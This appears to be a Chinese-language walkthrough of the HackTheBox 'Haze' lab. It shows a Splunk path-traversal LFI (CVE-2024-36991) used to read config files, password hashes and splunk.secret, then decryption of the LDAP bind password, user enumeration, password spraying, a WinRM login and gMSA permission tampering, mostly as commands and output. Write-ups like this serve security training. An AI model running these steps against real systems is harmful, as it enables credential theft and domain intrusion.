---
layout: config.default_layout
title: HackTheBox-Season7-Haze
date: 2025-04-04 00:41:27
updated: 2025-04-04 00:41:41
comments: true
tags: [HackTheBox,域渗透,Windows靶机,encrypt]
categories: 靶机
---

# Season7-Haze

> https://app.hackthebox.com/competitive/7/overview | `Hard` | `Windows`
> 

## 前期踩点

使用 `nmap` 进行扫描

```bash
⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -min-rate 10000 -p- 10.10.11.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:04 EDT
Warning: 10.10.11.61 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.61
Host is up (0.33s latency).
Not shown: 59223 closed tcp ports (conn-refused), 6285 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8000/tcp  open  http-alt
8088/tcp  open  radan-http
8089/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
56730/tcp open  unknown
56739/tcp open  unknown
56740/tcp open  unknown
56742/tcp open  unknown
56779/tcp open  unknown
56941/tcp open  unknown
```

添加域名`haze.htb` 和 `dc01.haze.htb`

```bash
⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -A -T4 -O -p 53,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,56730,56739,56740,56742,56779,56941 10.10.11.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:10 EDT
Nmap scan report for 10.10.11.61
Host is up (0.41s latency).                                                                              
                                                                                                         
PORT      STATE SERVICE       VERSION 
53/tcp    open  domain        Simple DNS Plus                                                            
135/tcp   open  msrpc         Microsoft Windows RPC 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                              
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc01.haze.htb       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb             
| Not valid before: 2025-03-05T07:12:20                                                                  
|_Not valid after:  2026-03-05T07:12:20             
445/tcp   open  microsoft-ds?                       
464/tcp   open  kpasswd5?                           
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc01.haze.htb       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb             
| Not valid before: 2025-03-05T07:12:20                                                                  
|_Not valid after:  2026-03-05T07:12:20             
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                 
| ssl-cert: Subject: commonName=dc01.haze.htb      
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb         
| Not valid before: 2025-03-05T07:12:20                                                                  
|_Not valid after:  2026-03-05T07:12:20                                                                  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          | ssl-cert: Subject: commonName=dc01.haze.htb                                                            
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb                                                                                                                       | Not valid before: 2025-03-05T07:12:20                                                                                                                                                                            
|_Not valid after:  2026-03-05T07:12:20                                                                  
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-title: Not Found                                                                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                                                              
8000/tcp  open  http          Splunkd httpd                                                                                                                                                                        
|_http-server-header: Splunkd                                                                            
| http-robots.txt: 1 disallowed entry 
|_/                                       
| http-title: Site doesn't have a title (text/html; charset=UTF-8).                  
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F               
8088/tcp  open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser  
| Not valid before: 2025-03-05T07:29:08                                                                  
|_Not valid after:  2028-03-04T07:29:08                                                                                                                                                                            
| http-robots.txt: 1 disallowed entry                                                                                                                                                                              
|_/                                                                                                      
|_http-title: 404 Not Found     
|_http-server-header: Splunkd                                                                            
8089/tcp  open  ssl/http      Splunkd httpd                                                              
|_http-server-header: Splunkd         
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                      
| Not valid before: 2025-03-05T07:29:08             
|_Not valid after:  2028-03-04T07:29:08                                                                  
|_http-title: splunkd                                                                                                                                                                                              
| http-robots.txt: 1 disallowed entry               
|_/                                                 
9389/tcp  open  mc-nmf        .NET Message Framing                                                       
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                    
|_http-server-header: Microsoft-HTTPAPI/2.0         
|_http-title: Not Found                             
49664/tcp open  msrpc         Microsoft Windows RPC 
49665/tcp open  msrpc         Microsoft Windows RPC                                                      
49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                
49667/tcp open  msrpc         Microsoft Windows RPC 
49668/tcp open  msrpc         Microsoft Windows RPC 
56730/tcp open  msrpc         Microsoft Windows RPC                                                      
56739/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        
56740/tcp open  msrpc         Microsoft Windows RPC 
56742/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                
56779/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                
56941/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose                                                                             
Running (JUST GUESSING): Microsoft Windows 10|2022|2016|2012|2019|Vista|11|7|8.1|2008 (93%)              
OS CPE: cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2008::sp2                    
Aggressive OS guesses: Microsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2019 (93%), Microsoft Windows Server 2016 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2022 (91%), Microsoft Windows 11 21H2 (91%)                                   
No exact OS matches for host (test conditions non-ideal).                                                
Network Distance: 2 hops                                                                                                                                                                                           
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                               
                                                                                                         
Host script results:                                                                                     
|_clock-skew: 7h41m12s                                                                                                                                                                                             
| smb2-security-mode:                                                                                    
|   3:1:1:                            
|_    Message signing enabled and required
| smb2-time:                                                                                             
|   date: 2025-03-31T12:53:32                                                                            
|_  start_date: N/A                        
                                                                                                         
TRACEROUTE (using proto 1/icmp)                                                                          
HOP RTT       ADDRESS                                                                                                                                                                                              
1   461.62 ms xxxxxxx                                                                                                                                                                                           
2   286.29 ms 10.10.11.61                                                                                
                                                    
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .    
Nmap done: 1 IP address (1 host up) scanned in 116.57 seconds                 
```

尝试枚举 SMB 和 LDAP 匿名

```bash
⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb                                                
Password for [WORKGROUP\root]:   

⚡ root@kali  ~/Desktop/test/Haze  ldapsearch -x -H ldap://dc01.haze.htb                                                                                                  
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CAF, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

访问 `8000` 端口，运行的是`Splunk-Enterprise`

![image.png](image64.png)

## Splunk

通过搜索引擎对其进行公开漏洞搜索，存在任意文件读取漏洞

我们通过工具来扫描：https://github.com/bigb0x/CVE-2024-36991 

得到几个域内用户名`Mark`，`paul`，`Edward` 

```bash
⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  python3 CVE-2024-36991.py -u http://dc01.haze.htb:8000                                  
/root/Desktop/test/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence '\ '
  """)

                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
                                                                           
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
-> By x.com/MohamedNab1l
-> Use Wisely.

[INFO] Testing single target: http://dc01.haze.htb:8000
[VLUN] Vulnerable: http://dc01.haze.htb:8000
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

但是靶机是`Windows`的，不会存在`/etc/passwd`文件，所以应该是容器

https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Splunk%20Enterprise/Splunk-Enterprise%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md

```bash
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

我们通过`curl` 来尝试，成功读取

```bash
⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl 10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini 
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
[MAPI=1
```

## Splunk LFI 利用

根据目录结构来构造`LFI` 

目录结构（官方）：https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles

1. `splunk/etc/system/local/inputs.conf`
    
    ```bash
    curl "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../program%20files/splunk/etc/system/local/server.conf"
    ```
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/server.conf"
    [general]
    serverName = dc01
    pass4SymmKey = $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==
    
    [sslConfig]
    sslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==
    
    [lmpool:auto_generated_pool_download-trial]
    description = auto_generated_pool_download-trial
    peers = *
    quota = MAX
    stack_id = download-trial
    
    [lmpool:auto_generated_pool_forwarder]
    description = auto_generated_pool_forwarder
    peers = *
    quota = MAX
    stack_id = forwarder
    
    [lmpool:auto_generated_pool_free]
    description = auto_generated_pool_free
    peers = *
    quota = MAX
    stack_id = free
    
    ```
    
2. `splunk/etc/passwd` 
    
    不是容器，而是`Splunk`的配置文件
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/passwd"
    :admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
    :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
    :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
    :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
    ```
    
3. `splunk/etc/system/local/authentication.conf`
其中 `bindDN` 是 `Paul Taylor`，并且 `bindDNpassword` 是加密的 `$7$` 格式（ GPT 说是 Splunk 的 `pass4SymmKey` 加密）
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/Haze  curl "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/authentication.conf"
    [splunk_auth]
    minPasswordLength = 8
    minPasswordUppercase = 0
    minPasswordLowercase = 0
    minPasswordSpecial = 0
    minPasswordDigit = 0
    
    [Haze LDAP Auth]
    SSLEnabled = 0
    anonymous_referrals = 1
    bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
    bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
    charset = utf8
    emailAttribute = mail
    enableRangeRetrieval = 0
    groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
    groupMappingAttribute = dn
    groupMemberAttribute = member
    groupNameAttribute = cn
    host = dc01.haze.htb
    nestedGroups = 0
    network_timeout = 20
    pagelimit = -1
    port = 389
    realNameAttribute = cn
    sizelimit = 1000
    timelimit = 15
    userBaseDN = CN=Users,DC=haze,DC=htb
    userNameAttribute = samaccountname
    
    [authentication]
    authSettings = Haze LDAP Auth
    authType = LDAP
    ```
    
4. `splunk/etc/auth/splunk.secret`
    
    通过对关键字“Splunk Secret” 的搜索，搜索到了：https://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207
    
    The splunk.secret file is located in the `$SPLUNK_HOME/etc/auth` directory. It is used to encrypt and decrypt the passwords in the Splunk configuration files.
    splunk.secret 文件位于 `$SPLUNK_HOME/etc/auth` 目录中。它用于加密和解密 Splunk 配置文件中的密码。
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/Haze  curl "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/auth/splunk.secret"      
    NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD#   
    ```
    

## Splunk.Secret

在 `GitHub` 对其该关键字进行搜索找到一个工具：https://github.com/HurricaneLabs/splunksecrets

splunksecrets is a tool for working with Splunk secrets offline

splunksecrets 是一种用于离线使用 Splunk 密钥的工具

将`Splunk.Secret`保存到本地，使用`splunksecrets`进行破解

```bash
⚡ root@kali  ~/Desktop/test/Haze  splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=' 
Ld@p_Auth_Sp1unk@2k24
```

得到密码`Ld@p_Auth_Sp1unk@2k24`

## 枚举

拿到密码后进行枚举

```bash
⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
 ⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.61     5985   DC01             [-] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

```bash
⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb -U dc01.haze.htb/paul.taylor%'Ld@p_Auth_Sp1unk@2k24' --option='client min protocol=SMB2'  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

`SMB`找不到任何信息

上面`LDAP`验证也是过的，我们直接使用`BloodHound`

```bash
⚡ root@kali  ~/Desktop/test/Haze  bloodhound-python -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb' -ns 10.10.11.61 --zip -c All -dc 'dc01.haze.htb'
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 3 users
INFO: Found 32 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 18 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 01M 01S
INFO: Compressing output into 20250331033810_bloodhound.zip
```

使用`BloodHound`进行分析

Paul是`RESTRICTED USERS@HAZE.HTB`组的成员，受限用户，并且只能找到三个用户`paul.taylor`，`Haze-IT-Backup$` ，`dc01$` 

![image.png](image65.png)

对域进行用户名枚举，任何再对其进行密码喷洒，因为之前还得到了`MARK`和`Edward` 等用户，但是名不全没办法进行利用

字典来自于：https://github.com/zer0yu/Berserker （试了好多字典）

```bash
⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 10.10.11.61 -d haze.htb ~/Desktop/test/Haze/Berserker/brute/common/username/usernames_5000.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev () - 03/31/25 - Ronnie Flathers @ropnop

2025/03/31 04:16:53 >  Using KDC(s):
2025/03/31 04:16:53 >   10.10.11.61:88

2025/03/31 04:17:33 >  [+] VALID USERNAME:       paul.taylor@haze.htb
2025/03/31 04:18:03 >  [+] VALID USERNAME:       edward.martin@haze.htb
2025/03/31 04:20:39 >  [+] VALID USERNAME:       mark.adams@haze.htb
2025/03/31 04:22:59 >  Done! Tested 5000 usernames (3 valid) in 365.646 seconds
```

得到三个用户

```bash
paul.taylor
edward.martin
mark.adams
```

再次进行枚举

```bash
⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
⚡ root@kali  ~/Desktop/test/Haze  nxc winrm 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.61     5985   DC01             [-] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.61     5985   DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)
⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
```

`mark.adams` 拥有 `winrm`  的凭据，使用`evil-winrm`进行登录

登陆成功

```bash
⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mark.adams\Documents> 
```

## 域内信息收集

上传`SharpHound`进行域内信息收集

```bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> upload ../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe                                                          
                                        
Info: Uploading /root/Desktop/test/Haze/../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe to C:\Users\mark.adams\Documents\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\mark.adams\Documents> ./SharpHound.exe -c all
2025-03-31T09:22:29.6650145-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-03-31T09:22:29.7900186-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-31T09:22:29.8056473-07:00|INFORMATION|Initializing SharpHound at 9:22 AM on 3/31/2025
2025-03-31T09:22:29.9150180-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for haze.htb : dc01.haze.htb
2025-03-31T09:22:30.0557183-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-31T09:22:30.1650235-07:00|INFORMATION|Beginning LDAP search for haze.htb
2025-03-31T09:22:30.1962697-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-03-31T09:22:30.2119118-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-03-31T09:23:00.3681410-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2025-03-31T09:23:14.7118901-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for haze.htb : dc01.haze.htb
2025-03-31T09:23:14.9306620-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-03-31T09:23:14.9618914-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-03-31T09:23:15.0087652-07:00|INFORMATION|Status: 100 objects finished (+100 2.272727)/s -- Using 45 MB RAM
2025-03-31T09:23:15.0087652-07:00|INFORMATION|Enumeration finished in 00:00:44.8366245
2025-03-31T09:23:15.0556437-07:00|INFORMATION|Saving cache with stats: 60 ID to type mappings.
 59 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-03-31T09:23:15.0712709-07:00|INFORMATION|SharpHound Enumeration Completed at 9:23 AM on 3/31/2025! Happy Graphing!

*Evil-WinRM* PS C:\Users\mark.adams\Documents> download 20250331092314_BloodHound.zip
```

BloodHound 分析

mark 属于 `Domain users`，`GMSA_managers`，`REMOTE_managent_users`

![image.png](image66.png)

![image.png](image67.png)

## GMSA 组利用 & 域分析

查看组`GMSA_managers`的权限

如果 `GMSA_managers` 具有读取 gMSA 密码的权限，可以尝试 **获取 gMSA 账户的密码**，然后使用该账户进行访问。

查看域中所有`gMSA`账户

```bash
*Evil-WinRM* PS C:\program files> Get-ADServiceAccount -Filter *  
                                                               
DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled           : True                       
Name              : Haze-IT-Backup                  
ObjectClass       : msDS-GroupManagedServiceAccount  
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780
SamAccountName    : Haze-IT-Backup$ 
SID               : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName :      
```

检查可访问`gMAS`账户

```bash
*Evil-WinRM* PS C:\program files> Get-ADServiceAccount -Filter * | Select-Object Name,DistinguishedName  

Name           DistinguishedName
----           -----------------
Haze-IT-Backup CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
```

查看一下 **`Haze-IT-Backup`** gMSA 允许哪些用户读取密码

```bash
*Evil-WinRM* PS C:\program files> Get-ADServiceAccount -Identity "Haze-IT-Backup" -Properties PrincipalsAllowedToRetrieveManagedPassword

DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
```

只允许`Domain Admins` 组的用户

思路断了，根据提示，`MARK`用户拥有修改**`PrincipalsAllowedToRetrieveManagedPassword`** 的权限

```bash
*Evil-WinRM* PS C:\program files> Set-ADServiceAccount -Identity Haze-IT-Backup$ -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
*Evil-WinRM* PS C:\program files> Get-ADServiceAccount -Identity Haze-IT-Backup$ -Properties PrincipalsAllowedToRetrieveManagedPassword

DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
